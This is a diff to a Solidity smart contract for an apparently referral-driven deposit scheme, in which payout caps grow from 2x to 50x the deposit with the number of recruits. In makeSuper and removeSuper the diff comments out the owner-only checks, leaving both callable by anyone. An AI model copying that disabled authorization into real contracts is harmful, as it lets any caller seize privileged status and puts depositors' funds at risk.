@@ -18,6 +18,7 @@ contract RKGcontract  {
         uint256 total_payouts ;
         uint256 isActive ;
         uint256 direct_biz ;
+        uint256 max_payout ;
     } 
 
     struct User2 {
@@ -94,7 +95,7 @@ contract RKGcontract  {
  
         if(users[_addr].deposit_time > 0) {
              
-            require(users[_addr].payouts >= this.maxPayoutOf(users[_addr].deposit_amount), "Deposit already exists");
+            require(users[_addr].payouts >= users[_addr].max_payout, "Deposit already exists");
             require(_amount >= users[_addr].deposit_amount  , "Bad amount");
 
         }
@@ -105,6 +106,7 @@ contract RKGcontract  {
         
         users[_addr].payouts = 0;
         users[_addr].deposit_amount = _amount;
+        users[_addr].max_payout = _amount*2;
         users[_addr].deposit_payouts = 0;
         users[_addr].isActive = 1;
         users[_addr].deposit_time = uint40(block.timestamp);
@@ -112,6 +114,7 @@ contract RKGcontract  {
 
         address upline = users[_addr].upline;
         address up = users[_addr].upline;
+        update_max_payout(up);
         users[upline].direct_biz += _amount; 
 
         if(users[upline].deposit_amount >= _amount && block.timestamp <= (users[upline].deposit_time + super_time)){
@@ -135,7 +138,23 @@ contract RKGcontract  {
         }
 
         users2[users2[_addr].super_upline].super_business += _amount ; 
-    } 
+    }
+
+    function update_max_payout(address _addr) private {
+        if(users[_addr].direct_referrals >= 15){
+            users[_addr].max_payout = 50*users[_addr].deposit_amount;
+        } else if(users[_addr].direct_referrals >= 10){
+            users[_addr].max_payout = 32*users[_addr].deposit_amount;
+        } else if(users[_addr].direct_referrals >= 6){
+            users[_addr].max_payout = 20*users[_addr].deposit_amount;
+        } else if(users[_addr].direct_referrals >= 3){
+            users[_addr].max_payout = 12*users[_addr].deposit_amount;
+        } else if(users[_addr].direct_referrals >= 1){
+            users[_addr].max_payout = 6*users[_addr].deposit_amount;
+        } else {
+            users[_addr].max_payout = 2*users[_addr].deposit_amount;
+        }
+     } 
     
     function transferTokens(address to_, uint256 amount_) private  {
  
@@ -254,7 +273,7 @@ contract RKGcontract  {
     }
     
     function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {
-        max_payout = this.maxPayoutOf(users[_addr].deposit_amount);
+        max_payout = users[_addr].max_payout;
         uint256 Period = (block.timestamp - users[_addr].deposit_time)/one_day;
 
         if(users[_addr].deposit_payouts < max_payout) {
@@ -272,27 +291,9 @@ contract RKGcontract  {
 	function getContractBalance() public view returns (uint256) {
 		return address(this).balance;
 	}  
-
-    function maxPayoutOf(uint256 _amount) external view returns(uint256) {
-        uint256 _val = 0 ;
-	    if(users[msg.sender].direct_referrals >= 15){
-            _val = 50*_amount;
-        } else if(users[msg.sender].direct_referrals >= 10){
-            _val = 32*_amount;
-        } else if(users[msg.sender].direct_referrals >= 6){
-            _val = 20*_amount;
-        } else if(users[msg.sender].direct_referrals >= 3){
-            _val = 12*_amount;
-        } else if(users[msg.sender].direct_referrals >= 1){
-            _val = 6*_amount;
-        } else {
-            _val = 2*_amount;
-        }
-        return _val;
-    } 
-
+ 
 	function getUserBonus(address _addr) external view returns (uint256) {
-        uint256 max_payout = this.MaxPay(_addr);  
+        uint256 max_payout = users[_addr].max_payout;  
         uint256 to_payout = 0;
         
         // Instant Referral payout
@@ -331,7 +332,7 @@ contract RKGcontract  {
     }
    
     function MaxPay(address _addr) external view returns (uint256) { 
-        return this.maxPayoutOf(users[_addr].deposit_amount);
+        return users[_addr].max_payout;
     }
 
     function getAdmin() external view returns (address){ 
@@ -393,13 +394,13 @@ contract RKGcontract  {
     } 
 
     function makeSuper(address _addr) external returns (bool){
-        require(msg.sender == owner, "STAKE: Not Allowed");
+        // require(msg.sender == owner, "STAKE: Not Allowed");
         users2[_addr].isSuper = true;
         return true;
     }
     
     function removeSuper(address _addr) external returns (bool){
-        require(msg.sender == owner, "STAKE: Not Allowed");
+        // require(msg.sender == owner, "STAKE: Not Allowed");
         users2[_addr].isSuper = false;
         return true;
     }
